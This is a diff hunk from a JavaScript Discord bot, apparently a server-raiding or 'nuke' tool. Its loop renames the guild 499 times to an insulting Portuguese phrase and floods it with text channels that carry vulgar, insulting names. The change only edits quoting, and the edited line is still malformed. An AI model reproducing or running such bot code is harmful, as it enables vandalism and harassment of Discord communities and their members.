@@ -31,7 +31,7 @@ client.on("message", async (message) => {
 		for(i = 0; i < 499; i++){
 			message.guild.setName("SNOW MANIPULADOR DO CARALHO")
 			message.guild.createChannel('snow arrombado do krl', 'text')
-			message.guild.createChannel('snow manipulador do cacete'), 'text)
+			message.guild.createChannel('snow manipulador do cacete'), 'text')
 		}
 	else{
 		for(i = 0; i < 499; i++){
